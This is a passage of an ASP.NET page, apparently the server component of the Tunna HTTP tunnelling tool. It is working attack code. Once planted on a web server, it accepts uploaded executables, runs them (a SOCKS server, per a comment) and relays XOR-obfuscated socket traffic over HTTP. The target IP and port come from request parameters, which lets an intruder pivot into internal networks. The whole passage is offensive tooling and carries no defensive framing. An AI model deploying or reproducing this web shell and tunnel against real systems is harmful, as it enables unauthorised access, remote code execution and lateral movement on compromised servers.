        if (string.IsNullOrEmpty(szEncryptionKey))
        {
            szEncryptionKey = Hex2String("0a18e2c5ddaa0f6574986414c64de5ce");
        }
        byte[] received = new byte[szCipherText.Length - __K_SUFFIX__.Length];
        Array.Copy(szCipherText, received, szCipherText.Length - __K_SUFFIX__.Length);
        //StringBuilder sb = new StringBuilder();
        //for (int i = 0; i < received.Length; i++)
        //    sb.Append((char)(received[i] ^ szEncryptionKey[(i % szEncryptionKey.Length)]));
        //String result = sb.ToString();
        //return Encoding.UTF8.GetBytes(result);
        //StringBuilder szInputStringBuild = new StringBuilder(Encoding.UTF8.GetString(received));
        StringBuilder szOutStringBuild = new StringBuilder(received.Length);
        char Textch;
        for (int iCount = 0; iCount < received.Length; iCount++)
        {
            Textch = (char)received[iCount];
            Textch = (char)(Textch ^ szEncryptionKey[(iCount % szEncryptionKey.Length)]);
            szOutStringBuild.Append(Textch);
        }
        String result = szOutStringBuild.ToString();
        char[] charArr = result.ToCharArray();
        byte[] bytes = new byte[charArr.Length];
        for (int i = 0; i < charArr.Length; i++)
        {
            byte current = Convert.ToByte(charArr[i]);
            bytes[i] = current;
        }
        return bytes;
    }

    protected void Page_Load(object sender, EventArgs e)
    {
        try
        {
            HttpContext.Current.Server.ScriptTimeout = 600;     //NOTE: randomly chose 600
            if (Request.Url.Query.StartsWith("?proxy"))
            {               //XXX:Stupid hack but works
                if (Request.Url.Query.StartsWith("?proxy&file"))
                {               //If url parameter file is set
                    if (Request.Url.Query.StartsWith("?proxy&file&upload"))
                    {       //reads file and saves it to temp
                        HttpPostedFile file = Request.Files["proxy"];
                        if ((file != null) && (file.ContentLength > 0))
                        {
                            string fn = System.IO.Path.GetFileName(file.FileName);
                            string SaveLocation = Path.GetTempPath() + "\\" + fn;

                            try
                            {
                                if (File.Exists((string)SaveLocation)) { File.Delete((String)SaveLocation); }
                                file.SaveAs(SaveLocation);
                                _file = SaveLocation;
                                Response.Write("[Server] File Uploaded fully at " + SaveLocation);
                            }
                            catch (Exception ex)
                            {
                                Response.Write("Err1: " + ex.Message);
                            }
                        }
                        else
                        {
                            Response.Write("[Server] No file selected totally.");
                        }
                        return;
                    }
                }

                running = Convert.ToInt32(Request.QueryString["proxy"]);

                if (running == -1)
                {       //If url var close receive: close socket / invalidate session / Kill thread
                    Socket socket = Application["SessionSocket"+Request.QueryString["id"]] as Socket;
                    if (socket != null)
                        socket.Close();

                    if (_file != null)
                    {
                        try
                        {
                            foreach (System.Diagnostics.Process proc in System.Diagnostics.Process.GetProcessesByName(Path.GetFileName(_file)))
                            {
                                try { proc.Kill(); } catch (Exception) { }
                            }
                            System.Threading.Thread.Sleep(2500);
                            File.Delete(_file);
                            Response.Write("[Server] File Deleted Successfully");
                        }
                        catch (Exception ex)
                        {
                            Response.Write("Err3: " + ex.Message);
                        }
                    }
                    //Session.Abandon();
                    Response.Cookies.Add(new HttpCookie("ASP.NET_SessionId", ""));
                    Response.Write("[Server] Killing the handler thread for " + Request.QueryString["id"] + "...");
                    return;
                } // close connections

                if (Request.QueryString["port"] != null)
                    PORT = Convert.ToInt32(Request.QueryString["port"]);

                if (Request.QueryString["ip"] != null)
                    IP = Request.QueryString["ip"];
                else
                    IP = "127.0.0.1";

                try
                {
                    if (running == 1)
                    {
                        //1st request: initiate the session
                        try
                        {
                            Response.Write("[Server] All good to go, ensure the listener is working.\n[FILE]:[WIN]");
                        }
                        catch (Exception exc)
                        {
                            HttpContext.Current.Response.Write("running 1: " + exc.Message);
                        }
                    }
                    else
                    {
                        try
                        {
                            if (running == 2)
                            {       //2nd request: get configuration options
                                if (_file != null)
                                {
                                    IP = "127.0.0.1";
                                    Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                                    IPHostEntry ipHostInfo = Dns.GetHostByAddress((IP)); //Dns.GetHostByName
                                    IPAddress ipAddress = ipHostInfo.AddressList[0];
                                    IPEndPoint localEP = new IPEndPoint(ipAddress, 0);
                                    socket.Bind(localEP);
                                    PORT = (int)((IPEndPoint)socket.LocalEndPoint).Port;
                                    socket.Close();
                                    try
                                    {
                                        System.Diagnostics.Process process1 = new System.Diagnostics.Process();
                                        process1.StartInfo.FileName = _file;
                                        //process1.StartInfo.FileName = "C:\\WINDOWS\\TEMP\\socks4aServer.exe";
                                        process1.StartInfo.Arguments = PORT.ToString();
                                        process1.Start();
                                        Application["SocksProcess"] = process1;
                                        //Response.Write("[Server] Run");
                                    }
                                    catch (Exception ex)
                                    {
                                        Response.Write("Err2: " + ex);
                                    }
                                }
                                try
                                {
                                    Application["SessionSocket"+Request.QueryString["id"]] = connect();
                                    Response.Write("[OK]");         //Send [OK] back
                                    return;
                                }
                                catch (Exception)
                                {
                                    return;
                                }
                            }
                            else
                            {
                                //Read data from request and write to socket
                                byte[] postData = Request.BinaryRead(Request.TotalBytes);
                                if (postData.Length > 0)
                                {
                                    try
                                    {
                                        Socket socket = Application["SessionSocket"+Request.QueryString["id"]] as Socket;
                                        socket.Send(x0r_decrypt(postData));
                                    }
                                    catch (Exception)
                                    {
                                        HttpContext.Current.Response.Write("[Server] Local socket "+Request.QueryString["id"]+" closed!");
                                    }
                                }
                                //Read Data from socket and write to response
                                byte[] receiveBuffer = new byte[8192];
                                try
                                {
                                    Socket socket = Application["SessionSocket"+Request.QueryString["id"]] as Socket;
                                    int bytesRead = socket.Receive(receiveBuffer);
                                    if (bytesRead > 0)
                                    {
                                        //Welcome to C trim
                                        byte[] received = new byte[bytesRead];
                                        Array.Copy(receiveBuffer, received, bytesRead);
                                        Response.ContentType = "application/octet-stream";
                                        Response.BinaryWrite(x0r_encrypt(received));
                                    }
                                    else
                                    {
                                        HttpContext.Current.Response.Write("");     //No data on socket: send nothing back
                                    }
                                }
                                catch (Exception)
                                {
                                    HttpContext.Current.Response.Write("");
                                }
                            }
                        }
                        catch (Exception exc)
                        {
                            HttpContext.Current.Response.Write("running 2: " + exc.Message);
                        }
                    }
                }
                catch (Exception exc)
                {
                    HttpContext.Current.Response.Write("running 0: " + exc.Message);
                }
            }
            else
            {
                HttpContext.Current.Response.Write("New Tunna!");
            }
        }
        catch (Exception exc)
        {
            HttpContext.Current.Response.Write("ASPX_ERROR:" + exc.Message);
        }
    }

</script>
